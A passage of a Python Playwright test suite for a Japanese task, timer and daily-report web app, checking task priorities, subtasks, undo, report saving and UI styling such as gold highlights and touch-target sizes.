        self.assertTrue(page.is_visible("#task-list .task-slot[data-priority=mid] #task-form"))
        self.assertEqual(page.get_attribute("#task-form .prio-chips .chip[data-priority=mid]", "aria-pressed"), "true")
        page.fill("#task-title", "見積もり")
        page.click("#task-submit")
        self.assertEqual(self.open_titles(page), ["見積もり"])
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]["priority"], "mid")
        self.assertTrue(page.is_hidden("#task-form"))
        self.assertTrue(page.is_hidden("#task-list .task-slot[data-priority=mid] .add-slot"))  # タスクができたら点線の欄は ＋ に変わる
        # 見出しの ＋ から開くと、フォームは見出しのすぐ下（タスクより上）
        page.click("#task-list .task-group[data-priority=mid] .add-plus")
        order = page.evaluate("""() => { const f = document.getElementById('task-form').closest('li');
          return [f.previousElementSibling.dataset.priority, f.previousElementSibling.className, f.nextElementSibling.className]; }""")
        self.assertEqual(order, ["mid", "task-group", "task-item"])
        self.assertEqual(page.query_selector_all("#task-list .task-group[data-priority=mid] .add-plus"), [])  # 開いている間は ＋ を隠す
        # フォームの中で優先度を変えれば、そちらに入る
        page.fill("#task-title", "掃除")
        page.click("#task-form .prio-chips .chip[data-priority='']")
        page.click("#task-submit")
        stored = json.loads(page.evaluate("localStorage.getItem('db.tasks')"))
        self.assertEqual([t["priority"] for t in stored], ["mid", None])
        self.assertEqual(stored[1]["subtasks"], [])
        self.assertIn("掃除", page.text_content("#task-list .task-group[data-priority=none] ~ li"))
        # やめると閉じて、欄に戻る
        page.click("#task-list .task-slot[data-priority=low] .add-slot")
        page.click("#task-cancel")
        self.assertTrue(page.is_hidden("#task-form"))
        self.assertTrue(page.is_visible("#task-list .task-slot[data-priority=low] .add-slot"))

    def test_task_row_actions_edit_and_delete(self):
        """行の丸（四角）以外を押すと操作の一覧。編集で名前・期限・優先度・日報へ・ミニタスクを直せる（D-070）。"""
        tasks = [{"id": "a", "title": "資料", "due": None, "done": False, "createdAt": 1}]
        page = self.tasks_page(tasks=tasks)
        self.assertEqual(page.query_selector_all("#task-list .task-del"), [])  # ごみ箱は行に出さない
        page.click("#task-list li[data-id=a] .task-main")
        self.assertTrue(page.is_visible("#task-actions"))
        self.assertEqual(page.text_content("#task-actions-title"), "資料")
        self.assertFalse(json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]["done"])  # 完了にはしない
        page.click("#task-act-edit")
        page.wait_for_selector("#task-edit", state="visible")
        page.fill("#edit-title", "資料を送る")
        page.click("#task-edit .due-chips .chip[data-due=tomorrow]")
        page.click("#task-edit .prio-chips .chip[data-priority=high]")
        page.click("#edit-report")
        for name in ("下書き", "", "確認"):  # 空の名前は保存しない
            page.click("#edit-sub-add")
            page.fill("#edit-subs li:last-child input", name)
        self.assertEqual(page.text_content("#edit-sub-count"), "3/10")
        page.click("#task-edit-save")
        page.wait_for_selector("#task-edit", state="hidden")
        t = json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]
        self.assertEqual([t["title"], t["due"], t["priority"], t["toReport"]], ["資料を送る", "2026-11-10", "high", True])
        self.assertEqual([x["title"] for x in t["subtasks"]], ["下書き", "確認"])
        self.assertIn("資料を送る", page.text_content("#task-list .task-group[data-priority=high] ~ li"))
        self.assertEqual(page.text_content("#task-list li[data-id=a] .sub-count"), "0/2")
        # 編集でミニタスクを消す。やめると何も変わらない
        page.click("#task-list li[data-id=a] .task-main")
        page.click("#task-act-edit")
        page.click("#edit-subs li:first-child .task-del")
        page.click("#task-edit-cancel")
        self.assertEqual(len(json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]["subtasks"]), 2)
        page.click("#task-list li[data-id=a] .task-main")
        page.click("#task-act-edit")
        page.click("#edit-subs li:first-child .task-del")
        page.click("#task-edit-save")
        self.assertEqual([x["title"] for x in json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]["subtasks"]], ["確認"])
        # 削除は赤・確認つき
        page.click("#task-list li[data-id=a] .task-main")
        self.assertIn("danger", page.get_attribute("#task-act-delete", "class"))
        page.click("#task-act-delete")
        self.assertEqual(page.text_content("#confirm-text"), "「資料を送る」を削除しますか？")
        page.click("#confirm-ok")
        page.wait_for_selector("#task-toast", state="visible", timeout=3_000)
        self.assertEqual(self.open_titles(page), [])

    def test_task_start_runs_work_timer_with_task_name(self):
        """操作の一覧の「タスクを開始」：タスクの名前で作業のタイマー（変えた時間）を始めてタイマーの画面へ（D-071）"""
        tasks = [{"id": "a", "title": "資料を作る", "due": None, "done": False, "createdAt": 1},
                 {"id": "b", "title": "済み", "due": None, "done": True, "doneAt": int(datetime(2026, 11, 9, 9, 0).timestamp() * 1000), "createdAt": 2}]
        init = "localStorage.setItem('db.timer', JSON.stringify({ custom: [], builtin: { work: 50 }, running: null, done: null }))"
        page = self.clock_page(10, 0, "#tasks", init_script="localStorage.setItem('db.tasks', %s);" % json.dumps(json.dumps(tasks)) + init)
        page.wait_for_selector("#view-tasks", state="visible")
        page.click("#task-list li[data-id=a] .task-main")
        self.assertEqual(page.text_content("#task-act-start"), "タスクを開始作業のタイマー 50分")
        page.click("#task-act-start")
        page.wait_for_selector("#view-timer", state="visible")
        self.assertEqual(page.text_content("#timer-name"), "資料を作る（50分）")
        r = json.loads(page.evaluate("localStorage.getItem('db.timer')"))["running"]
        self.assertEqual([r["name"], r["minutes"], r["kind"]], ["資料を作る", 50, "work"])
        self.assertFalse(json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]["done"])  # 完了にはしない
        # 動いているタイマーがあれば確かめる。「やめる」なら置き換えない
        page.evaluate("location.hash = '#tasks'")
        page.click("#task-list li[data-id=a] .task-main")
        page.click("#task-act-start")
        self.assertEqual(page.text_content("#confirm-text"), "動いているタイマー「資料を作る」を止めて、「資料を作る」を始めますか？")
        self.assertNotIn("danger", page.get_attribute("#confirm-ok", "class"))  # 消す操作ではないので赤にしない
        page.click("#confirm-cancel")
        self.assertEqual(page.evaluate("location.hash"), "#tasks")
        # 完了したタスクには出さない
        page.click("#done-section summary")
        page.click("#done-list li[data-id=b] .task-main")
        self.assertTrue(page.is_hidden("#task-act-start"))

    def test_subtasks_open_check_add_and_limit(self):
        """ミニタスク：行の下に「済み/全部」の帯と ▾。開くと親の下に並び、最後に「＋ ミニタスクを追加」。10個まで（D-070）。"""
        subs = [{"id": f"s{i}", "title": f"小{i}", "done": i < 2, "doneAt": None} for i in range(5)]
        tasks = [{"id": "a", "title": "親", "due": None, "done": False, "createdAt": 1, "subtasks": subs}]
        page = self.tasks_page(tasks=tasks)
        self.assertEqual(page.text_content("#task-list li[data-id=a] .sub-count"), "2/5")
        self.assertEqual(page.get_attribute("#task-list li[data-id=a] .sub-bar", "aria-expanded"), "false")
        self.assertEqual(page.query_selector_all("#task-list .sub-row"), [])  # ふだんはたたむ
        page.click("#task-list li[data-id=a] .sub-bar")
        self.assertEqual(page.eval_on_selector_all("#task-list .sub-title", "els => els.map(e => e.textContent)"), [f"小{i}" for i in range(5)])
        say = page.text_content("#tasks-say-line")
        page.click("#task-list .sub-row[data-sub=s2] .sub-check")
        self.assertEqual(page.text_content("#task-list li[data-id=a] .sub-count"), "3/5")
        self.assertEqual(page.text_content("#tasks-say-line"), say)  # キィニチは何も言わない
        self.assertTrue(page.is_hidden("#task-toast"))
        stored = json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]
        self.assertTrue(stored["subtasks"][2]["done"])
        self.assertFalse(stored["done"])  # 全部終わっても親は自動で完了にしない
        page.click("#task-list li[data-id=a] .sub-add-btn")
        page.press("#task-list li[data-id=a] .sub-add-form input", "Enter")  # 空のままなら閉じる
        self.assertTrue(page.is_visible("#task-list li[data-id=a] .sub-add-btn"))
        self.assertEqual(len(json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]["subtasks"]), 5)
        for sid in ("s3", "s4"):
            page.click(f"#task-list .sub-row[data-sub={sid}] .sub-check")
        self.assertFalse(json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]["done"])
        self.assertEqual(page.text_content("#task-list li[data-id=a] .sub-count"), "5/5")
        # 足す：1つずつ。10個まで
        page.click("#task-list li[data-id=a] .sub-add-btn")
        self.assertTrue(page.evaluate("document.activeElement.matches('.sub-add-form input')"))
        for i in range(5):  # 足したあとも欄は開いたまま
            page.fill("#task-list li[data-id=a] .sub-add-form input", f"足す{i}")
            page.press("#task-list li[data-id=a] .sub-add-form input", "Enter")
        self.assertEqual(page.text_content("#task-list li[data-id=a] .sub-count"), "5/10")
        self.assertEqual(page.query_selector_all("#task-list li[data-id=a] .sub-add"), [])  # 10個で欄ごと消える
        self.assertEqual(len(json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]["subtasks"]), 10)
        # 押せる範囲は 44px 以上
        for sel in ("#task-list .sub-check", "#task-list .sub-bar", "#task-list .task-done-btn"):
            box = page.eval_on_selector(sel, "e => { const r = e.getBoundingClientRect(); return [r.width, r.height]; }")
            self.assertGreaterEqual(min(box) if sel != "#task-list .sub-bar" else box[1], 44, sel)

    def test_parent_complete_finishes_subtasks_and_undo_restores(self):
        """親を完了にすると残りのミニタスクも済み。取り消すと元に戻る。日報へはミニタスクの名前を入れない（D-070）。"""
        subs = [{"id": "s1", "title": "下書き", "done": True, "doneAt": 5}, {"id": "s2", "title": "清書", "done": False, "doneAt": None}]
        tasks = [{"id": "a", "title": "手紙", "due": None, "done": False, "createdAt": 1, "toReport": True, "subtasks": subs}]
        page = self.tasks_page(tasks=tasks)
        page.click("#task-list li[data-id=a] .task-done-btn")
        page.wait_for_selector("#done-list li[data-id=a]", state="attached", timeout=3_000)
        t = json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]
        self.assertTrue(t["done"])
        self.assertEqual([x["done"] for x in t["subtasks"]], [True, True])
        self.assertEqual(t["subtasks"][0]["doneAt"], 5)
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.reports')"))["2026-11-09"]["done"], "・手紙")
        page.click("#task-toast .undo")
        t = json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]
        self.assertFalse(t["done"])
        self.assertEqual([x["done"] for x in t["subtasks"]], [True, False])
        self.assertEqual(page.text_content("#task-list li[data-id=a] .sub-count"), "1/2")

    def test_report_mood_week(self):
        """日報の「これまで」の上に、直近7日の調子の印が出る（CR-G03）。"""
        reports = {"2026-11-08": {"mood": "good", "done": "a", "left": "", "tomorrow": "", "savedAt": 1},
                   "2026-11-06": {"mood": "tired", "done": "b", "left": "", "tomorrow": "", "savedAt": 1}}
        init = "localStorage.setItem('db.reports', %s)" % json.dumps(json.dumps(reports))
        page = self.clock_page(20, 0, "#report", init_script=init)
        page.wait_for_selector("#mood-week .mood-day", timeout=3_000)
        moods = page.eval_on_selector_all("#mood-week .mood-day", "els => els.map(e => e.dataset.mood || '')")
        self.assertEqual(moods, ["", "", "", "tired", "", "good", ""])  # 11/3〜11/9
        self.assertIn("11/8 元気", page.get_attribute("#mood-week", "aria-label"))

    # ---------- タスク画面（D-026 ①） ----------
    def tasks_page(self, hour=10, minute=0, day=9, tasks=None, size=(393, 852)):
        init = None
        if tasks is not None:
            init = "localStorage.setItem('db.tasks', %s)" % json.dumps(json.dumps(tasks))
        page = self.clock_page(hour, minute, "#tasks", day=day, init_script=init, size=size)
        page.wait_for_selector("#view-tasks", state="visible", timeout=3_000)
        return page

    def open_titles(self, page):
        return page.eval_on_selector_all("#task-list .task-title", "els => els.map(e => e.textContent)")

    def test_tasks_empty_state_shows_character_line(self):
        page = self.tasks_page()
        page.wait_for_function("document.getElementById('tasks-say-line').textContent !== '…'", timeout=3_000)
        self.assertTrue(page.is_visible("#tasks-say"))
        data = json.loads(FIXTURE_DIALOGUE.read_text(encoding="utf-8"))
        lines = data["screen_empty"]["conditions"][0]["lines"]
        self.assertIn(page.text_content("#tasks-say-line"), lines)
        self.assertTrue(page.is_hidden("#done-section"))

    def test_add_task_with_due_chip_and_persist(self):
        page = self.tasks_page()
        page.click(ADD_NONE)
        self.assertTrue(page.is_visible("#task-form"))
        page.fill("#task-title", "資料を送る")
        page.click("#task-form .chip[data-due=tomorrow]")
        self.assertEqual(page.input_value("#task-due"), "2026-11-10")
        page.click("#task-submit")
        self.assertEqual(self.open_titles(page), ["資料を送る"])
        self.assertEqual(page.text_content("#task-list .task-due"), "明日まで")
        self.assertEqual(page.text_content("#tasks-say-line"), "残りはこれだけだ。一つずつ片づけろ。")  # 0件のときとは別の一言
        self.assertTrue(page.is_hidden("#task-form"))
        page.reload()
        page.wait_for_selector("#view-tasks", state="visible")
        self.assertEqual(self.open_titles(page), ["資料を送る"])

    def test_empty_title_is_not_added(self):
        page = self.tasks_page()
        page.click(ADD_NONE)
        page.fill("#task-title", "   ")
        page.click("#task-submit")
        self.assertIn("入力してください", page.text_content("#task-form-status"))
        self.assertEqual(self.open_titles(page), [])

    def test_open_tasks_sorted_by_due(self):
        tasks = [
            {"id": "a", "title": "期限なし", "due": None, "done": False, "createdAt": 1},
            {"id": "b", "title": "今日", "due": "2026-11-09", "done": False, "createdAt": 2},
            {"id": "c", "title": "期限切れ", "due": "2026-11-07", "done": False, "createdAt": 3},
            {"id": "d", "title": "来週", "due": "2026-11-16", "done": False, "createdAt": 4},
        ]
        page = self.tasks_page(tasks=tasks)
        self.assertEqual(self.open_titles(page), ["期限切れ", "今日", "来週", "期限なし"])
        dues = page.eval_on_selector_all("#task-list .task-due", "els => els.map(e => [e.textContent, e.classList.contains('overdue')])")
        self.assertEqual(dues[0], ["期限切れ（11/7(土)）", True])
        self.assertEqual(dues[1], ["今日まで", False])
        self.assertEqual(dues[2][0], "11/16(月)まで")

    def test_complete_and_undo(self):
        tasks = [{"id": "a", "title": "洗濯", "due": None, "done": False, "createdAt": 1}]
        page = self.tasks_page(tasks=tasks)
        page.click("#task-list .task-done-btn")
        page.wait_for_selector("#done-list li", state="attached", timeout=3_000)  # チェックの印が入るのを見せてから移る（D-039 ⑧）
        self.assertEqual(self.open_titles(page), [])
        self.assertEqual(page.text_content("#done-count"), "1")
        self.assertTrue(page.is_visible("#task-toast"))
        self.assertIn("完了にしました", page.text_content("#task-toast"))
        page.click("#task-toast .undo")
        self.assertEqual(self.open_titles(page), ["洗濯"])
        self.assertTrue(page.is_hidden("#done-section"))
        # 完了→未完了に戻す操作はトーストを出さない
        page.click("#task-list .task-done-btn")
        page.click("#done-section summary")
        page.click("#done-list .task-done-btn")
        self.assertEqual(self.open_titles(page), ["洗濯"])
        self.assertTrue(page.is_hidden("#task-toast"))

    def test_delete_and_undo_restores_position(self):
        tasks = [{"id": k, "title": k, "due": None, "done": False, "createdAt": i} for i, k in enumerate(["一", "二", "三"])]
        page = self.tasks_page(tasks=tasks)
        page.click("#task-list li[data-id='二'] .task-main")
        page.click("#task-act-delete")
        self.assertEqual(page.text_content("#confirm-text"), "「二」を削除しますか？")
        self.assertEqual(self.open_titles(page), ["一", "二", "三"])  # 確認するまで消えない
        page.click("#confirm-cancel")
        self.assertTrue(page.is_hidden("#confirm"))
        self.assertEqual(self.open_titles(page), ["一", "二", "三"])
        page.click("#task-list li[data-id='二'] .task-main")
        page.click("#task-act-delete")
        page.click("#confirm-ok")
        page.wait_for_selector("#task-toast", state="visible", timeout=3_000)  # 確認の結果は非同期で届く
        self.assertEqual(self.open_titles(page), ["一", "三"])
        self.assertIn("削除しました", page.text_content("#task-toast"))
        page.click("#task-toast .undo")
        self.assertEqual(self.open_titles(page), ["一", "二", "三"])
        page.click("#task-list li[data-id='三'] .task-main")
        page.click("#task-act-delete")
        page.click("#confirm-ok")
        page.wait_for_selector("#task-toast", state="visible", timeout=3_000)  # 確認の結果は非同期で届く
        page.clock.run_for(5_100)
        self.assertTrue(page.is_hidden("#task-toast"))
        stored = json.loads(page.evaluate("localStorage.getItem('db.tasks')"))
        self.assertEqual([t["title"] for t in stored], ["一", "二"])

    def test_tasks_line_follows_situation(self):
        def task(i, due):
            return {"id": str(i), "title": f"t{i}", "due": due, "done": False, "createdAt": i}
        page = self.tasks_page(tasks=[task(1, "2026-11-08"), task(2, "2026-11-09"), task(3, None)])
        page.wait_for_function("document.getElementById('tasks-say-line').textContent !== '…'", timeout=3_000)
        self.assertEqual(page.text_content("#tasks-say-line"), "期限を過ぎたものがある。やるか、期限を引き直すか決めろ。")
        page.click("#task-list li[data-id='1'] .task-done-btn")  # 期限切れを完了にする → 今日までが残る
        page.wait_for_function("document.getElementById('tasks-say-line').textContent.startsWith('今日まで')", timeout=3_000)
        self.assertEqual(page.text_content("#tasks-say-line"), "今日までのものがある。先にそっちだ。")
        page.click("#task-list li[data-id='2'] .task-done-btn")
        page.wait_for_function("document.getElementById('tasks-say-line').textContent.startsWith('残り')", timeout=3_000)
        page.click("#task-list li[data-id='3'] .task-done-btn")  # 全部終わったら 0件のときの一言
        lines = json.loads(FIXTURE_DIALOGUE.read_text(encoding="utf-8"))["screen_empty"]["conditions"][0]["lines"]
        page.wait_for_function("lines => lines.includes(document.getElementById('tasks-say-line').textContent)", arg=lines, timeout=3_000)

    def test_done_tasks_show_date_and_vanish_after_a_week(self):
        def ms(day, hour=12):
            return int(datetime(2026, 11, day, hour, 0, 0).timestamp() * 1000)
        tasks = [
            {"id": "old", "title": "先週", "due": None, "done": True, "doneAt": ms(2, 23), "createdAt": 1},   # 11/2 完了 → 11/9 に消える
            {"id": "night", "title": "深夜", "due": None, "done": True, "doneAt": ms(3, 3), "createdAt": 2},   # 11/3 の3時＝11/2 の分（朝4時区切り。D-034）→ 消える
            {"id": "keep", "title": "七日目", "due": None, "done": True, "doneAt": ms(3, 4), "createdAt": 2},  # 11/3 完了 → 11/9 はまだ残る
            {"id": "nodate", "title": "日付なし", "due": None, "done": True, "createdAt": 3},                  # 完了日なし → 今日完了した扱い
            {"id": "open", "title": "未完了", "due": "2026-10-01", "done": False, "createdAt": 4},              # 未完了は古くても消さない
        ]
        page = self.tasks_page(tasks=tasks)
        stored = {t["id"]: t for t in json.loads(page.evaluate("localStorage.getItem('db.tasks')"))}
        self.assertEqual(sorted(stored), ["keep", "nodate", "open"])
        self.assertAlmostEqual(stored["nodate"]["doneAt"], ms(9, 10), delta=5_000)
        self.assertEqual(page.text_content("#done-count"), "2")
        page.click("#done-section summary")
        self.assertIn("11/3(火) に完了", page.text_content("#done-list li[data-id=keep]"))
        self.assertIn("1週間", page.text_content("#done-section .note"))
        page.clock.fast_forward(14 * 3600_000 + 60_000)  # 0:01。朝4時まではまだ 11/9 の続き
        page.evaluate("Tasks.render()")
        self.assertIn("keep", [t["id"] for t in json.loads(page.evaluate("localStorage.getItem('db.tasks')"))])
        page.clock.fast_forward(4 * 3600_000)  # 4:01。11/10 になり、11/3 完了のものも消える
        page.evaluate("Tasks.render()")
        self.assertEqual(sorted(t["id"] for t in json.loads(page.evaluate("localStorage.getItem('db.tasks')"))), ["nodate", "open"])

    def test_tasks_screen_gold_fill_and_touch_sizes(self):
        """金の塗りは、フォームを閉じている間はなし、開くと「追加」の1つだけ（D-070 案B、CR-F12）"""
        tasks = [{"id": "a", "title": "とても長いタスクの名前" * 4, "due": "2026-11-09", "done": False, "createdAt": 1,
                  "subtasks": [{"id": "s", "title": "小さいやつ" * 6, "done": False, "doneAt": None}]}]
        page = self.tasks_page(tasks=tasks, size=(375, 667))
        golds = """() => [...document.querySelectorAll('#view-tasks *')]
          .filter((e) => e.getClientRects().length && getComputedStyle(e).backgroundColor === 'rgb(232, 196, 92)')
          .map((e) => e.id || e.className)"""
        self.assertEqual(page.evaluate(golds), [])
        page.click("#task-list li[data-id=a] .sub-bar")
        h = page.eval_on_selector("#task-list .task-main", "e => e.getBoundingClientRect().height")
        self.assertGreaterEqual(h, 52)
        for sel in (".task-done-btn", ".prio-tag", ".add-slot", ".add-plus", ".sub-add-btn", ".sub-check"):
            box = page.eval_on_selector("#task-list " + sel, "e => { const r = e.getBoundingClientRect(); return [r.width, r.height]; }")
            self.assertGreaterEqual(min(box), 44, sel)
        self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), 375)  # 長い名前でも横にはみ出さない
        page.click(ADD_NONE)
        self.assertGreaterEqual(page.eval_on_selector("#task-title", "e => parseFloat(getComputedStyle(e).fontSize)"), 16)
        self.assertEqual(page.evaluate(golds), ["task-submit"])
        page.click("#task-cancel")
        page.click("#task-list li[data-id=a] .task-main")
        for sel in ("#task-act-edit", "#task-act-delete", "#task-actions-close"):
            self.assertGreaterEqual(page.eval_on_selector(sel, "e => e.getBoundingClientRect().height"), 44, sel)
        page.click("#task-act-edit")
        page.wait_for_selector("#task-edit", state="visible")
        gold_in_edit = page.evaluate("""() => [...document.querySelectorAll('#task-edit *')]
          .filter((e) => e.getClientRects().length && getComputedStyle(e).backgroundColor === 'rgb(232, 196, 92)').map((e) => e.id)""")
        self.assertEqual(gold_in_edit, ["task-edit-save"])
        r = page.evaluate("""() => { const b = document.getElementById('task-edit-save').getBoundingClientRect(); return [b.bottom, innerHeight]; }""")
        self.assertLessEqual(r[0], r[1])  # 「保存」はシートの下に貼り付いて見える

    def test_task_toast_fits_on_small_screen(self):
        tasks = [{"id": "a", "title": "とても長いタスクの名前を入れておく", "due": None, "done": False, "createdAt": 1}]
        page = self.tasks_page(tasks=tasks, size=(375, 667))
        page.click("#task-list .task-done-btn")
        undo_h = page.eval_on_selector("#task-toast .undo", "e => e.getBoundingClientRect().height")
        self.assertGreaterEqual(undo_h, 44)
        self.assertEqual(page.eval_on_selector("#task-toast .undo", "e => getComputedStyle(e).whiteSpace"), "nowrap")

    def test_task_form_buttons_visible_after_open(self):
        page = self.tasks_page(tasks=[{"id": k, "title": k, "due": None, "done": False, "createdAt": i} for i, k in enumerate("あいうえおかきくけこさしすせそ")])
        page.click(ADD_NONE)
        r = page.evaluate("""() => { const b = document.getElementById('task-submit').getBoundingClientRect();
          const tb = document.querySelector('.tabbar').getBoundingClientRect(); return [b.bottom, tb.top]; }""")
        self.assertLessEqual(r[0], r[1])

    def test_task_form_opens_in_view_from_last_slot(self):
        """タスクが多くても、下の欄から開いたフォームの「追加」はタブバーに隠れない（D-070）"""
        tasks = [{"id": k, "title": k, "due": None, "done": False, "createdAt": i} for i, k in enumerate("あいうえおかきくけこさしすせそ")]
        for size in ((393, 852), (375, 667)):
            page = self.tasks_page(tasks=tasks, size=size)
            page.click(ADD_NONE)
            page.wait_for_timeout(400)
            r = page.evaluate("""() => { const b = document.getElementById('task-title').getBoundingClientRect();
              const tb = document.querySelector('.tabbar').getBoundingClientRect(); return [b.top, b.bottom, tb.top]; }""")
            self.assertGreaterEqual(r[0], 0, size)
            self.assertLessEqual(r[1], r[2], size)

    def test_focused_field_has_single_gold_ring(self):
        """選んでいる入力欄は金の縁＋外側 1px の 1 本の輪。離れた外側の輪（outline）は重ねない（D-064 ⑤、CR-F01, P2-04）"""
        page = self.tasks_page()
        page.click(ADD_NONE)
        page.click("#task-title")
        st = page.eval_on_selector("#task-title", "e => { const s = getComputedStyle(e); return [s.outlineStyle, s.borderTopColor, s.boxShadow]; }")
        self.assertEqual(st[0], "none")
        self.assertEqual(st[1], "rgb(232, 196, 92)")
        self.assertIn("rgb(232, 196, 92)", st[2])

    def test_every_screen_heading_has_gold_line(self):
        """設定・仕様関連の見出しの下にも、ほかの画面と同じ金の線（D-064 ⑥、CR-F05）"""
        page = self.clock_page(10, 0)
        for view in ("schedule", "tasks", "timer", "report", "settings", "system"):
            page.evaluate(f"location.hash = '#{view}'")
            page.wait_for_selector(f"#view-{view}", state="visible")
            line = page.evaluate(f"""() => {{ const h = document.querySelector('#view-{view} > h1'); const sub = document.querySelector('#view-{view} > .sub-header');
              return h ? getComputedStyle(h, '::after').backgroundImage : getComputedStyle(sub).backgroundImage; }}""")
            self.assertIn("linear-gradient", line, view)
            self.assertIn("rgba(232, 196, 92, 0.55)", line, view)

    def test_no_rounded_buttons_anywhere(self):
        """角丸のボタンを残さない。はじめにの「通知を有効にして始める」と仕様関連の「通知を有効にする」も斜めの角の主ボタン（D-064 ⑦、CR-S01, CR-S03）"""
        html = (APP_DIR / "index.html").read_text(encoding="utf-8")
        self.assertEqual(re.findall(r"<button(?![^>]*class=)[^>]*>", html), [])  # 部品の形の付いていない素のボタンがない
        page = self.new_page(permissions=["notifications"])
        page.goto(self.base + "index.html?mode=standalone")  # 未設定：はじめに
        page.wait_for_selector("#setup-start", state="visible")
        st = page.eval_on_selector("#setup-start", "e => [getComputedStyle(e).borderRadius, getComputedStyle(e).clipPath]")
        self.assertEqual(st[0], "0px")
        self.assertIn("polygon", st[1])
        page = self.clock_page(10, 0, "#system")
        page.wait_for_selector("#view-system", state="visible")
        st = page.eval_on_selector("#enable-push", "e => [getComputedStyle(e).borderRadius, getComputedStyle(e).clipPath]")
        self.assertEqual(st[0], "0px")
        self.assertIn("polygon", st[1])

    def test_system_fields_are_not_black_holes(self):
        """仕様関連の入力欄も、ほかの画面と同じ「地より少し明るい面」。最奥の黒にしない（D-064 ⑦、CR-F01）"""
        page = self.clock_page(10, 0, "#system")
        page.wait_for_selector("#view-system", state="visible")
        want = page.eval_on_selector("#sync-url", "e => { const i = document.createElement('input'); e.after(i); const v = getComputedStyle(i).backgroundColor; i.remove(); return v; }")
        self.assertEqual(want, "rgba(244, 241, 232, 0.05)")
        for sel in ("#app-token", "#sync-url", "#sync-token"):
            self.assertEqual(page.eval_on_selector(sel, "e => getComputedStyle(e).backgroundColor"), want, sel)

    def test_settings_more_toggle_is_44px(self):
        """設定の「詳しく」は幅も高さも 44px 以上（D-064 ⑦、CR-A02）"""
        for size in ((393, 852), (375, 667)):
            page = self.clock_page(10, 0, "#settings", size=size)
            page.wait_for_selector("#view-settings", state="visible")
            boxes = page.eval_on_selector_all("#view-settings .more summary", "els => els.map(e => [e.getBoundingClientRect().width, e.getBoundingClientRect().height])")
            self.assertTrue(boxes)
            for w, h in boxes:
                self.assertGreaterEqual(w, 44, size)
                self.assertGreaterEqual(h, 44, size)

    # ---------- 日報画面（D-026 ②, D-027） ----------
    def report_page(self, hour=21, minute=0, day=9, reports=None, size=(393, 852)):
        init = None
        if reports is not None:
            init = "localStorage.setItem('db.reports', %s)" % json.dumps(json.dumps(reports))
        page = self.clock_page(hour, minute, "#report", day=day, init_script=init, size=size)
        page.wait_for_selector("#view-report", state="visible", timeout=3_000)
        return page

    def test_report_save_and_reload(self):
        page = self.report_page()
        self.assertEqual(page.text_content("#report-date"), "11月9日(月)の日報")
        page.click("#report-form .mood[data-mood=tired]")
        page.fill("#report-done", "資料を送った\n洗濯した")
        page.fill("#report-left", "請求書")
        page.fill("#report-tomorrow", "請求書を確認する")
        page.click("#report-save")
        self.assertEqual(page.text_content("#report-status"), "保存済み（21:00）")
        self.assertEqual(page.text_content("#report-save"), "更新する")
        page.wait_for_selector("#report-reply", state="visible", timeout=3_000)
        self.assertEqual(page.text_content("#report-reply-line"), "記録した。疲れているなら、今日は早めに休め。")
        stored = json.loads(page.evaluate("localStorage.getItem('db.reports')"))["2026-11-09"]
        self.assertEqual((stored["mood"], stored["done"], stored["left"], stored["tomorrow"]),
                         ("tired", "資料を送った\n洗濯した", "請求書", "請求書を確認する"))
        page.reload()
        page.wait_for_selector("#view-report", state="visible")
        self.assertEqual(page.input_value("#report-left"), "請求書")
        self.assertEqual(page.get_attribute("#report-form .mood[data-mood=tired]", "aria-pressed"), "true")

    def test_report_empty_is_not_saved(self):
        page = self.report_page()
        page.click("#report-save")
        self.assertIn("1つの項目", page.text_content("#report-status"))
        self.assertIsNone(page.evaluate("localStorage.getItem('db.reports')"))

    def test_report_before_4am_counts_as_previous_day(self):
        page = self.report_page(hour=1, minute=30, day=10)
        self.assertEqual(page.text_content("#report-date"), "11月9日(月)の日報")
        page.fill("#report-done", "夜ふかし")
        page.click("#report-save")
        self.assertIn("2026-11-09", json.loads(page.evaluate("localStorage.getItem('db.reports')")))

    def test_report_history_newest_first_and_excludes_today(self):
        reports = {
            "2026-11-07": {"mood": "good", "done": "七日", "savedAt": 1},
            "2026-11-08": {"mood": "normal", "done": "八日", "left": "残り", "savedAt": 2},
            "2026-11-09": {"mood": "tired", "done": "今日", "savedAt": 3},
        }
        page = self.report_page(reports=reports)
        dates = page.eval_on_selector_all("#report-list .report-item-date", "els => els.map(e => e.textContent)")
        self.assertEqual(dates, ["11月8日(日)", "11月7日(土)"])
        self.assertEqual(page.input_value("#report-done"), "今日")
        page.click("#report-list li:first-child summary")
        self.assertIn("残り", page.text_content("#report-list li:first-child dl"))

    def test_report_history_shows_seven_days_then_more(self):
        reports = {f"2026-10-{d:02d}": {"mood": "normal", "done": f"{d}日", "savedAt": d} for d in range(10, 26)}  # 16日分
        page = self.report_page(reports=reports)
        self.assertEqual(len(page.query_selector_all("#report-list li")), 7)
        self.assertEqual(page.text_content("#report-list li:first-child .report-item-date"), "10月25日(日)")
        self.assertEqual(page.text_content("#report-more"), "もっと見る（残り9日分）")
        page.click("#report-more")
        self.assertEqual(len(page.query_selector_all("#report-list li")), 14)
        page.click("#report-more")
        self.assertEqual(len(page.query_selector_all("#report-list li")), 16)
        self.assertTrue(page.is_hidden("#report-more"))
        self.assertEqual(len(json.loads(page.evaluate("localStorage.getItem('db.reports')"))), 16)  # データは消さない

    def test_report_selected_mood_is_gold_outline_with_check(self):
        page = self.report_page()
        sel = "#report-form .mood[data-mood=good]"
        self.assertTrue(page.is_hidden(sel + " .mood-check"))
        page.click(sel)
        self.assertTrue(page.is_visible(sel + " .mood-check"))
        style = page.eval_on_selector(sel, """e => [getComputedStyle(e).color, getComputedStyle(e).backgroundColor,
          getComputedStyle(e, '::before').backgroundColor]""")
        self.assertEqual(style[:2], ["rgb(232, 196, 92)", "rgb(232, 196, 92)"])  # 金の文字・金の縁
